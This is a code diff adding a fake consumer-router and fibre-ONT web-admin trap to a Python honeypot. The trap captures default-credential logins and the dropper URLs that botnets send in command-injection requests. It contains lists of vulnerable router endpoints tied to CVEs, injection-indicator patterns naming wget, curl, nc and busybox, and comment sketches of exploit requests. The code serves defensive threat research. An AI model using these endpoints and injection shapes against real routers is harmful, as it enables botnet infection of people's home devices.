@@ -25,7 +25,7 @@ from dataclasses import dataclass, field
 from datetime import UTC, datetime
 from pathlib import Path
 from typing import Callable
-from urllib.parse import parse_qs, parse_qsl, quote, unquote
+from urllib.parse import parse_qs, parse_qsl, quote, unquote, unquote_plus
 
 import aiohttp
 from aiohttp import web
@@ -1489,6 +1489,194 @@ _HNAP1_CMDI_INDICATORS = (
 def _hnap1_has_cmdi(soap_action: str, query: str, body_preview: str) -> bool:
     haystack = f"{soap_action} {query} {body_preview}".lower()
     return any(needle in haystack for needle in _HNAP1_CMDI_INDICATORS)
+
+
+# --- Fake SOHO router / GPON-ONT web-admin surface -----------------------
+# The embedded-httpd admin surface on consumer routers, fibre ONTs and
+# NVR/IP-camera gateways. `/HNAP1` (above) already covers the D-Link SOAP
+# dialect and earns steady traffic; the rest of the same scanner
+# dictionary — the BOA/Realtek `/boaform/*` admin forms, the Netgear DGN
+# `/setup.cgi` syscmd hole, the TP-Link `;stok=` LuCI path, the Tenda/ZTE
+# `/goform/*` handlers and the Linksys "TheMoon" unblock CGIs — 404s
+# today. That matters because these are not fingerprint probes: the
+# request itself carries the exploit, and the exploit carries a payload
+# URL.
+#
+# Two behaviours this trap is built to capture:
+#
+#   1. **Default-credential login.** `/boaform/admin/formLogin` takes
+#      `username=` / `psd=` in the query string or an urlencoded body.
+#      Botnet workers walk a small default-credential dictionary here.
+#      Capturing the pairs separates device-family targeting (an ONT
+#      dictionary looks nothing like a DVR one).
+#   2. **Command injection with a dropper URL.** e.g. the Netgear
+#      `/setup.cgi?...&todo=syscmd&cmd=...wget http://<host>/<bin>...`
+#      shape, or the CVE-2020-8958 `formPing` `target_addr` hole. The
+#      command string names the stage-2 host. Existing traps only set a
+#      boolean cmd-injection flag, so that URL currently survives only
+#      inside a truncated body preview — `_extract_payload_urls` lifts
+#      it into a structured field instead.
+#
+# Responding 200 with a success-shaped login result is deliberate: the
+# interesting request is usually the *second* one, and a worker that
+# gets a 404 on login never sends it.
+SOHO_ROUTER_ENABLED = _env_bool("HONEYPOT_SOHO_ROUTER_ENABLED")
+
+# Login / auth forms. A GET with no credentials returns the login page;
+# credentials in query or body flip it to the capture path.
+_SOHO_ROUTER_LOGIN_PATHS = (
+    "/boaform/admin/formLogin",
+    "/boaform/formLogin",
+    "/boaform/admin/formLogin.cgi",
+    "/goform/login",
+    "/login.cgi",
+    "/cgi-bin/login.cgi",
+    "/cgi/login.cgi",
+    "/index/login.cgi",
+    "/web/cgi-bin/hi3510/login.cgi",
+    "/login.rsp",
+    "/cgi-bin/webproc",
+    "/cgi-bin/adm.cgi",
+)
+
+# Diagnostic / config handlers — the command-injection sinks. Each of
+# these takes an operand (ping target, MAC, SSID, filename) that
+# vulnerable firmware concatenates into a shell command.
+_SOHO_ROUTER_DIAG_PATHS = (
+    # BOA / Realtek GPON-ONT admin forms (CVE-2020-8958 family)
+    "/boaform/admin/formPing",
+    "/boaform/formPing",
+    "/boaform/admin/formTracert",
+    "/boaform/admin/formSysCmd",
+    "/boaform/admin/formWsc",
+    "/boaform/admin/formDMZ",
+    "/boaform/admin/formFilter",
+    # Netgear DGN series (CVE-2017-6334) — `todo=syscmd&cmd=`
+    "/setup.cgi",
+    # TP-Link Archer AX21 (CVE-2023-1389) — `country=$(...)`
+    "/cgi-bin/luci/;stok=/locale",
+    "/cgi-bin/luci/",
+    # Tenda / ZTE `/goform/*` handlers
+    "/goform/formJsonAjaxReq",
+    "/goform/setSysAdm",
+    "/goform/goform_get_cmd_process",
+    "/goform/set_hidessid_cfg",
+    "/goform/setmac",
+    "/goform/formWsc",
+    "/goform/aspForm",
+    "/goform/formping",
+    "/goform/telnet",
+    "/goform/SetVirtualServerCfg",
+    "/goform/setUsbUnload",
+    "/goform/downloadSyslog/syslog.log",
+    # Linksys "TheMoon" (CVE-2014-9583 lineage)
+    "/tmUnblock.cgi",
+    "/hndUnblock.cgi",
+    # D-Link SOAP CGI sibling of /HNAP1
+    "/soap.cgi",
+)
+
+_SOHO_ROUTER_DEFAULT_PATHS = ",".join(
+    _SOHO_ROUTER_LOGIN_PATHS + _SOHO_ROUTER_DIAG_PATHS
+)
+SOHO_ROUTER_PATHS = {
+    value.strip().lower()
+    for value in (
+        os.environ.get("HONEYPOT_SOHO_ROUTER_PATHS_CSV") or _SOHO_ROUTER_DEFAULT_PATHS
+    ).split(",")
+    if value.strip()
+}
+SOHO_ROUTER_LOGIN_PATHS = {p.lower() for p in _SOHO_ROUTER_LOGIN_PATHS}
+
+SOHO_ROUTER_VENDOR = (os.environ.get("HONEYPOT_SOHO_ROUTER_VENDOR") or "Realtek").strip()
+SOHO_ROUTER_MODEL = (os.environ.get("HONEYPOT_SOHO_ROUTER_MODEL") or "RTL9601D").strip()
+# Firmware string inside the CVE-2020-8958 disclosure window so workers
+# that gate exploit delivery on a version banner don't bail early.
+SOHO_ROUTER_FIRMWARE = (os.environ.get("HONEYPOT_SOHO_ROUTER_FIRMWARE") or "V1.03.30").strip()
+
+# Form field names carrying credentials across the dialects above.
+# `psd` is the BOA/ONT spelling; the rest are the usual embedded-httpd
+# variants.
+_SOHO_ROUTER_USER_FIELDS = (
+    "username", "user", "usr", "loginusername", "luci_username",
+    "admin_username", "uname", "account", "userid",
+)
+_SOHO_ROUTER_PASS_FIELDS = (
+    "psd", "password", "pass", "pwd", "loginpassword", "luci_password",
+    "admin_password", "passwd", "userpassword",
+)
+
+_SOHO_ROUTER_CMDI_INDICATORS = (
+    "$(", "`", "&&", "||", ";", "|", "wget ", "curl ", "/bin/sh", "/bin/busybox",
+    "tftp ", "busybox", "chmod ", "nc ", "telnetd", "rm -rf",
+)
+
+# Downloader invocations worth naming explicitly in the log — knowing
+# *which* fetch tool a worker reaches for is a cheap family split.
+_SOHO_ROUTER_DOWNLOADERS = ("wget", "curl", "tftp", "busybox", "ftpget", "nc")
+
+# Payload / stage-2 URLs inside an injected command. Covers the bare
+# `http://host/bin` form plus the `tftp -g -r <file> <host>` shape that
+# carries no scheme.
+_SOHO_ROUTER_URL_RE = re.compile(
+    r"(?:https?|ftp|tftp)://[^\s\"'<>`|;)&]{3,300}", re.I
+)
+_SOHO_ROUTER_TFTP_RE = re.compile(
+    # `-r` is excluded from the generic flag class on purpose: letting it
+    # match there lets the flag group swallow `-r <file>` and the host
+    # group then binds to the filename instead of the server.
+    r"tftp\s+(?:-[gilv]\s+)*(?:-r\s+(?P<file>[^\s;&|]{1,120})\s+)?"
+    r"(?:-[gilv]\s+)*(?P<host>\d{1,3}(?:\.\d{1,3}){3}|[a-z0-9][a-z0-9.-]*\.[a-z]{2,20})",
+    re.I,
+)
+
+
+def _soho_router_has_cmdi(query: str, body_preview: str, path: str) -> bool:
+    haystack = f"{path} {query} {body_preview}".lower()
+    return any(needle in haystack for needle in _SOHO_ROUTER_CMDI_INDICATORS)
+
+
+def _extract_payload_urls(*parts: str) -> list[str]:
+    """Lift stage-2 / dropper URLs out of an injected command string.
+
+    Returns a de-duplicated, order-preserving list. Both the schemed
+    form (`wget http://host/bin`) and the scheme-less TFTP form
+    (`tftp -g -r bin host`) are recognised; the latter is normalised to
+    a `tftp://host/file` URL so downstream consumers see one shape.
+    """
+    found: list[str] = []
+    seen: set[str] = set()
+    for part in parts:
+        if not part:
+            continue
+        for match in _SOHO_ROUTER_URL_RE.findall(part):
+            url = match.rstrip(".,'\")")
+            if url.lower() not in seen:
+                seen.add(url.lower())
+                found.append(url)
+        for m in _SOHO_ROUTER_TFTP_RE.finditer(part):
+            host = (m.group("host") or "").strip()
+            if not host or "." not in host:
+                continue
+            # Skip when the same host already arrived via a schemed URL.
+            if any(host.lower() in u.lower() for u in found):
+                continue
+            file_part = (m.group("file") or "").strip().lstrip("/")
+            url = f"tftp://{host}/{file_part}" if file_part else f"tftp://{host}"
+            if url.lower() not in seen:
+                seen.add(url.lower())
+                found.append(url)
+    return found[:12]
+
+
+def _extract_downloaders(*parts: str) -> list[str]:
+    """Which fetch tools the injected command reaches for."""
+    haystack = " ".join(p for p in parts if p).lower()
+    # `=` and quotes are boundaries too: the command almost always arrives
+    # as the value of a form field (`cmd=tftp -g ...`), so a class that
+    # only allows whitespace/shell metacharacters misses the first token.
+    return [tool for tool in _SOHO_ROUTER_DOWNLOADERS
+            if re.search(rf"""(?:^|[\s;&|`(/='"]){re.escape(tool)}(?:\s|$)""", haystack)]
 
 
 # --- Fake GeoServer admin / OGC endpoints (CVE-2024-36401 bait) ----------
@@ -3494,6 +3682,20 @@ def is_hnap1_path(path: str) -> bool:
     if not HNAP1_ENABLED:
         return False
     return path.lower() in HNAP1_PATHS
+
+
+def is_soho_router_path(path: str) -> bool:
+    if not SOHO_ROUTER_ENABLED:
+        return False
+    lpath = path.lower()
+    if lpath in SOHO_ROUTER_PATHS:
+        return True
+    # TP-Link's LuCI hole carries a per-request session token in the path
+    # itself (`/cgi-bin/luci/;stok=<hex>/locale`), so an exact match on the
+    # bare form is not enough.
+    if lpath.startswith("/cgi-bin/luci/;stok="):
+        return True
+    return False
 
 
 def is_server_status_path(path: str) -> bool:
@@ -23065,6 +23267,206 @@ async def _handle_onvif(
     )
 
 
+def _soho_router_pick_credentials(
+    query_params: dict[str, list[str]],
+    form_params: dict[str, list[str]],
+) -> tuple[str, str, str]:
+    """Pull a (username, password, source) triple out of query/body params.
+
+    Returns empty strings when neither dialect matched. Query wins over
+    body only when the body carries nothing — the BOA login form is
+    routinely sent both ways by the same worker.
+    """
+    for source, params in (("body", form_params), ("query", query_params)):
+        if not params:
+            continue
+        lowered = {k.lower(): v for k, v in params.items()}
+        user = ""
+        password = ""
+        for field_name in _SOHO_ROUTER_USER_FIELDS:
+            if lowered.get(field_name):
+                user = lowered[field_name][0]
+                break
+        for field_name in _SOHO_ROUTER_PASS_FIELDS:
+            if lowered.get(field_name):
+                password = lowered[field_name][0]
+                break
+        if user or password:
+            return user[:200], password[:200], source
+    return "", "", ""
+
+
+def render_soho_router_login_html(vendor: str, model: str, firmware: str) -> bytes:
+    """Login page for the embedded-httpd admin surface. Deliberately
+    plain: real ONT/router login pages are a table-layout form with an
+    inline stylesheet and no external assets, and a worker that fetches
+    referenced CSS/JS it can't resolve is a tell we don't want to give."""
+    v = _html_escape_attr(vendor)
+    m = _html_escape_attr(model)
+    f = _html_escape_attr(firmware)
+    body = f"""<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">
+<title>{m}</title>
+<style type="text/css">
+body {{ font-family: Arial, Helvetica, sans-serif; font-size: 12px;
+        background-color: #e8e8e8; margin: 0px; }}
+.hdr {{ background-color: #4a6c8e; color: #ffffff; padding: 6px 10px;
+        font-size: 14px; font-weight: bold; }}
+.box {{ margin: 40px auto; width: 340px; background-color: #ffffff;
+        border: 1px solid #b0b0b0; }}
+.pad {{ padding: 14px; }}
+td {{ font-size: 12px; }}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="hdr">{v} {m}</div>
+<div class="pad">
+<form method="POST" action="/boaform/admin/formLogin">
+<table border="0" cellpadding="4" cellspacing="0">
+<tr><td>Username</td><td><input type="text" name="username" size="18"></td></tr>
+<tr><td>Password</td><td><input type="password" name="psd" size="18"></td></tr>
+<tr><td colspan="2" align="right">
+<input type="submit" value="Login">
+<input type="hidden" name="loginUser" value="">
+</td></tr>
+</table>
+</form>
+</div>
+</div>
+<div align="center" style="color:#707070;">Firmware {f}</div>
+</body>
+</html>
+"""
+    return body.encode("utf-8")
+
+
+async def _handle_soho_router(
+    request: web.Request,
+    log_context: dict[str, object],
+    path: str,
+    query_string: str,
+    request_body: bytes,
+) -> web.Response:
+    """Fake SOHO router / GPON-ONT web-admin surface.
+
+    Three outcomes, each with its own result tag:
+
+      * `soho-router-login`      — login page served, no credentials yet
+      * `soho-router-credential` — credentials captured off query or body
+      * `soho-router-diag`       — a diagnostic/config handler answered
+
+    Any of the three additionally carries `sohoRouterPayloadUrls` /
+    `sohoRouterDownloaders` when the request smuggled a stage-2 fetch,
+    which is the signal this trap exists to produce.
+    """
+    method = request.method
+    lpath = path.lower()
+
+    body_preview = ""
+    if request_body:
+        body_preview = request_body[:WEBSHELL_BODY_DECODE_LIMIT].decode(
+            "utf-8", errors="replace"
+        )
+
+    query_params = parse_qs(query_string, keep_blank_values=True) if query_string else {}
+    form_params = parse_form_body(request_body, request.headers.get("Content-Type", ""))
+
+    # The injected command arrives percent-encoded, and in a query string
+    # or urlencoded body `+` means space — so `unquote_plus`, not
+    # `unquote`. Using the latter leaves `wget+http://host/bin+-O+/tmp/x`
+    # as one token, which both hides the downloader and glues the shell's
+    # trailing arguments onto the extracted URL.
+    decoded_query = unquote_plus(query_string or "")
+    decoded_body = unquote_plus(body_preview)
+
+    has_cmdi = _soho_router_has_cmdi(decoded_query, decoded_body, lpath)
+    payload_urls = _extract_payload_urls(decoded_query, decoded_body)
+    downloaders = _extract_downloaders(decoded_query, decoded_body)
+
+    username, password, cred_source = _soho_router_pick_credentials(
+        query_params, form_params
+    )
+
+    is_login_path = lpath in SOHO_ROUTER_LOGIN_PATHS
+    set_cookie: str | None = None
+
+    if is_login_path and (username or password):
+        # Success-shaped result. Real ONT firmware answers a good login
+        # with a meta-refresh into the status page rather than a 302, and
+        # the worker's next request is the interesting one.
+        result_tag = "soho-router-credential"
+        session_id = secrets.token_hex(16)
+        set_cookie = f"SESSIONID={session_id}; path=/"
+        body = (
+            '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n'
+            "<html><head>"
+            '<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">'
+            '<meta http-equiv="refresh" content="0; url=/admin/status.asp">'
+            "</head>\n"
+            "<body><p>Login OK.</p></body></html>\n"
+        ).encode("utf-8")
+        content_type = "text/html; charset=iso-8859-1"
+    elif is_login_path:
+        result_tag = "soho-router-login"
+        body = render_soho_router_login_html(
+            SOHO_ROUTER_VENDOR, SOHO_ROUTER_MODEL, SOHO_ROUTER_FIRMWARE
+        )
+        content_type = "text/html; charset=iso-8859-1"
+    else:
+        # Diagnostic / config handler. Vulnerable firmware echoes the
+        # operand back into a <pre> block of command output, so mirroring
+        # that shape is what makes a successful-looking injection read as
+        # successful — without ever running anything.
+        result_tag = "soho-router-diag"
+        body = (
+            '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">\n'
+            "<html><head><title>Diagnostics</title></head>\n"
+            "<body>\n<pre>\n"
+            "PING session started.\n"
+            "--- statistics ---\n"
+            "4 packets transmitted, 4 received, 0% packet loss\n"
+            "</pre>\n"
+            '<a href="/boaform/admin/formPing">Back</a>\n'
+            "</body></html>\n"
+        ).encode("utf-8")
+        content_type = "text/html; charset=iso-8859-1"
+
+    log_entry: dict[str, object] = {
+        **log_context,
+        "status": 200,
+        "result": result_tag,
+        "sohoRouterPath": path,
+        "sohoRouterMethod": method,
+        "sohoRouterHasCmdInjection": has_cmdi,
+        "bytes": len(body),
+    }
+    if username or password:
+        log_entry["sohoRouterUsername"] = username
+        log_entry["sohoRouterPassword"] = password
+        log_entry["sohoRouterCredSource"] = cred_source
+    if payload_urls:
+        log_entry["sohoRouterPayloadUrls"] = payload_urls
+    if downloaders:
+        log_entry["sohoRouterDownloaders"] = downloaders
+    if body_preview:
+        log_entry["bodyPreview"] = body_preview
+    append_log(log_entry)
+
+    headers = {
+        "Content-Type": content_type,
+        # The embedded HTTP server that ships on Realtek-based ONT
+        # firmware. Scanners that gate on the server banner match this.
+        "Server": "Boa/0.94.14rc21",
+        "Cache-Control": "no-cache",
+    }
+    if set_cookie:
+        headers["Set-Cookie"] = set_cookie
+    return web.Response(status=200, body=body, headers=headers)
+
+
 async def _handle_hnap1(
     request: web.Request,
     log_context: dict[str, object],
@@ -26678,6 +27080,11 @@ async def handle(request: web.Request) -> web.StreamResponse:
 
     if is_hnap1_path(path):
         return await _handle_hnap1(request, log_context, path, query_string, request_body)
+
+    if is_soho_router_path(path):
+        return await _handle_soho_router(
+            request, log_context, path, query_string, request_body
+        )
 
     if is_server_status_path(path):
         return await _handle_server_status(request, log_context, path, query_string)
